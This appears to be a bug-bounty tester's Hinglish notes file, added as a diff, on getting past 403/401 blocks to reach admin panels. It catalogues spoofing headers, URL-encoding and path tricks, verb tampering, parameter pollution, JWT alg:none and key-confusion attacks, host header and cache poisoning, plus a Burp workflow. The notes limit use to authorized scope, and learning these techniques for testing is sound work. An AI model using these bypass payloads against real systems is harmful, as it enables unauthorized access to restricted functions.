@@ -1,0 +1,117 @@
+# 403/401 Bypass & Admin Panel Access — Complete Reference
+
+## 1. Path-Based Bypass Headers
+| Header | Purpose |
+|---|---|
+| `X-Original-URL: /admin` | Backend original path use karta hai, WAF sirf request-line path check karta hai |
+| `X-Rewrite-URL: /admin` | Nginx/Apache rewrite rule bypass |
+| `X-Override-URL: /admin` | Kuch frameworks mein alt override |
+
+---
+
+## 2. IP/Trust Spoofing Headers
+| Header | Purpose |
+|---|---|
+| `X-Forwarded-For: 127.0.0.1` | "Localhost se request aa rahi hai" spoof |
+| `X-Forwarded-For: 127.0.0.1, target.com` | Chained proxy spoof — kai apps last IP check karti hain |
+| `X-Custom-IP-Authorization: 127.0.0.1` | Custom internal-trust header |
+| `X-Forwarded-Host: 127.0.0.1` | Host-based access control bypass |
+| `X-Host: 127.0.0.1` | Legacy internal-only trust bypass |
+| `X-Originating-IP: 127.0.0.1` | Legacy filter bypass |
+| `X-Remote-IP: 127.0.0.1` | Legacy filter bypass |
+| `X-Remote-Addr: 127.0.0.1` | Legacy filter bypass |
+| `X-Client-IP: 127.0.0.1` | Reverse proxy trust bypass |
+| `X-Real-IP: 127.0.0.1` | Reverse proxy trust bypass |
+| `True-Client-IP: 127.0.0.1` | Cloudflare-style trust header |
+| `CF-Connecting-IP: 127.0.0.1` | Cloudflare specific spoof |
+
+---
+
+## 3. Scheme/Method Override Headers
+| Header | Purpose |
+|---|---|
+| `X-Forwarded-Scheme: https` | Scheme-based restriction bypass |
+| `X-Forwarded-Proto: https` | Same purpose, alt name |
+| `X-HTTP-Method-Override: GET` | Method-based restriction bypass |
+| `X-HTTP-Method: PUT` | Force alt method processing |
+| `X-Method-Override: DELETE` | Force alt method processing |
+
+---
+
+## 4. URL Manipulation Techniques (No Header Needed)
+| Technique | Example |
+|---|---|
+| Trailing slash | `/admin/` instead of `/admin` |
+| Double slash | `//admin` |
+| Case change | `/Admin`, `/ADMIN` |
+| Path traversal trick | `/admin/..;/` or `/./admin` |
+| URL encoding | `/%61dmin` (= /admin, 'a' encoded) |
+| Double encoding | `/%2561dmin` |
+| Null byte (legacy apps) | `/admin%00.html` |
+| Adding extension | `/admin.json`, `/admin.html` |
+| Trailing dot | `/admin.` |
+| Semicolon trick | `/admin;/` |
+| Query string append | `/admin?` or `/admin#` |
+| Wildcard trick | `/admin/*` |
+| Unicode normalization | `/%c0%afadmin` |
+
+---
+
+## 5. Referer / Origin Based Bypass
+| Header | Purpose |
+|---|---|
+| `Referer: https://target.com/admin` | Referer-check bypass |
+| `Origin: https://target.com` | CORS/origin-based access check bypass |
+
+---
+
+## 6. Advance Techniques (Beyond Headers)
+
+### 6.1 Verb Tampering
+Different HTTP methods same endpoint pe alag access control follow karte hain — GET block ho toh HEAD, POST, PUT, DELETE, TRACE try karo. Kai backend frameworks sirf GET/POST filter karte hain, baaki methods bhool jaate hain.
+
+### 6.2 Parameter Pollution for Admin Bypass
+| Technique | Example |
+|---|---|
+| Duplicate param | `?admin=false&admin=true` |
+| Array injection | `?admin[]=true` |
+| JSON type juggling | `{"admin": "true"}` vs `{"admin": true}` vs `{"admin": 1}` |
+
+### 6.3 Race Condition on Access Control
+Agar role-check aur action ke beech time gap hai, Burp Turbo Intruder se parallel requests bhejo — kabhi kabhi check bypass ho jaata hai kyunki backend state update hone se pehle hi second request process ho jaati hai.
+
+### 6.4 JWT/Token Manipulation for Admin Access
+| Technique | Detail |
+|---|---|
+| `alg: none` attack | Signature verification bypass — algorithm ko "none" set karke fake token banao |
+| Role claim tampering | JWT payload mein `role: user` ko `role: admin` change karo (agar signature verify nahi ho raha) |
+| Key confusion (RS256 → HS256) | Public key ko HMAC secret ki tarah use karke fake signed token banao |
+
+### 6.5 Internal API/GraphQL Introspection
+Admin panels ke peeche kabhi internal API hoti hai — `/graphql` pe introspection query bhejo, hidden admin mutations/queries expose ho sakte hain.
+
+### 6.6 Cache-Based Bypass
+`X-Forwarded-Host` ya cache key manipulation se cached admin response ko poison karke doosre users tak leak karwa sakte ho (web cache poisoning + access control combo).
+
+### 6.7 Host Header Injection
+| Header | Purpose |
+|---|---|
+| `Host: internal-admin.target.com` | Virtual host routing confuse karke internal panel expose karna |
+| `X-Forwarded-Server: internal.target.com` | Same purpose, alt header |
+
+---
+
+## 7. Burp Practical Workflow
+1. 403/401 milne pe Repeater mein request bhejo
+2. Ek-ek header add karke response code check karo
+3. Combination try karo (`X-Forwarded-For` + `X-Original-URL` saath mein)
+4. HTTP method change karke retry karo (Verb Tampering)
+5. URL manipulation tricks (trailing slash, case change, encoding) try karo
+6. Agar JWT-based auth hai, token decode karke role tampering try karo
+7. Turbo Intruder se race condition bhi test karo agar action + check alag endpoints pe ho
+
+---
+
+## Notes
+- Yeh sab techniques sirf authorized scope ([[banco-plata-target]], [[syfe-target]]) ke andar hi try karna.
+- Har successful bypass ka payload/header combination [[burp-suite-mastery]] notes mein likhte jao future reference ke liye.
